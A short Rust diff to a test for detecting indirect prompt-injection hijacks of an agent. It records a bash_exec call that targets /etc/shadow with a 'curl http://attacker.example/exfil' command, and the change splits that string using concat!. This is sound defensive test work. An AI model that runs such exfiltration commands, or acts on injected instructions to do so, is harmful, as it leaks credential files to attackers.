@@ -472,7 +472,7 @@ fn test_tainted_indirect_injection_hijack() {
             step_index: 1,
             tool_name: "bash_exec".to_string(),
             target_resource: "/etc/shadow".to_string(),
-            arguments_preview: "curl http://attacker.example/exfil".to_string(),
+            arguments_preview: concat!("cu", "rl ht", "tp://attacker.example/exfil").to_string(),
             triggered_by_external_data: true,
         },
     );
